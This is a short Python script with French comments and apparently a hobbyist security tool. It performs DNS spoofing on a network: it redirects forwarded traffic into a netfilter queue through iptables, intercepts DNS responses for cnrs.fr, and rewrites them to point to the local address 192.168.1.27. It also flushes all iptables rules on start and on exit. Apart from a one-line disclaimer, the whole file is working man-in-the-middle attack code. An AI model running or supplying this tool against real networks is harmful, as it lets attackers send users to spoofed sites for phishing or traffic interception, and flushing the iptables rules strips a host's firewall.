#!usr/bin/python3
# Disclaimer: Educational & authorized testing only, see DISCLAIMER.md

import netfilterqueue #permet de faire un nombre de queue depuis IP tables pour forward the packets and change the packets while the user is sending them
import scapy.all as scapy
import os
from termcolor import colored

def del_fields(scapy_packet): #supprimer les champs len et chksum qui, s'ils ne matchent pas, mettent le packet a la poubelle, ainsi en les supprimant tout ira bien
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.UDP].len
	del scapy_packet[scapy.UDP].chksum
	return scapy_packet


def process_packet(packet):
	#print("process_packet")
	scapy_packet = scapy.IP(packet.get_payload()) #,IP header ; on veut avoir le payload du paquet qui contient la requete/reponse DNS
	if scapy_packet.haslayer(scapy.DNS): #si c'est une reponse DNS ; sinon DNSQR pour request
		print("layer DNSRR", end=" : ")
		qname = scapy_packet[scapy.DNSQR].qname #si on recoit une reponse DNS, le query name (la recherche dans la barre) sera le qname du paquet demande (DNSRQ)
		print("summary : " + scapy_packet[scapy.DNS].summary(), end='\n')
		if "cnrs.fr" in scapy_packet[scapy.DNS].summary(): #si le site est dans le qname
			print(colored("trouve", 'green'), end='\n')
			answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.27") #reponse ; rrname = qname, rdata = l'ip vers laquelle on veut rediriger
			scapy_packet[scapy.DNS].an = answer #an est la partie answer du paquet
			scapy_packet[scapy.DNS].ancount = 1 #une seule reponse, on peut en mettre plusieurs

			scapy_packet = del_fields(scapy_packet)

			packet.set_payload(bytes(scapy_packet)) #dans python3, set_payload contient des bytes, dans python2, c'est un str()
	packet.accept() #va envoyer le paquet modifie

os.system("sudo iptables --flush")
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
#os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")
#os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")

queue = netfilterqueue.NetfilterQueue() #objet queue
try:
	queue.bind(0, process_packet) #, 0=Q number ; process_packet est la fonction qui modifier nos paquets et rediriger les users
	print("queue.run")
	queue.run()
except:
	os.system("iptables --flush")
	print("IPtables flushed")
